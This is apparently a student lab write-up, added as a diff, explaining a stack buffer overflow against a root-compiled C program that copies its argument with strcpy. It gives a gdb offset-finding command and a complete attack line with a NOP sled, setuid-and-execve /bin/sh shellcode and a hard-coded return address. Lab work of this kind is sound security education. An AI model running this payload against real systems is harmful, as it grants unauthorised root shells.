@@ -1,0 +1,28 @@
+Explaination:
+	q7.c is a simple program that takes an argument when calling the program 
+	then copies it to a local buffer using the strcpy() method.  It was 
+	compiled using root access (similar to the BOF lab).  Similarly, stack 
+	randomization is disabled.
+
+	How this attack works is by first using gdb to debug the program.  First 
+	we have to get the right amount of buffer space to get to the return 
+	address (EIP) of the stack.  We do this by overflowing the buffer with 
+	'a's to start, 308 'a's produce a segmentation fault.
+
+	From this we know that the buffer should be 312 bytes long to overwrite 
+	the return address.  The shell code used to obtain root access is 53 
+	bytes long.  So we need 259 NOPs to fill the buffer with.
+
+	The last part of the attack vector is the last 4 bits of hex at the end 
+	of the print.  This is the memory location of one of the NOP commands, 
+	this way we can easily go to our shellcode to gain access to root 
+	privileges.
+
+GDB Debug:
+	gdb -q --args ./q7 `python -c 'print "a"*308'`
+
+Attack Vector:
+	./q7 `python -c 'print "\x90"*259 + "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb
+	\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d
+	\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff
+	\xff/bin/sh" + "\x94\xea\xff\xbf"'`
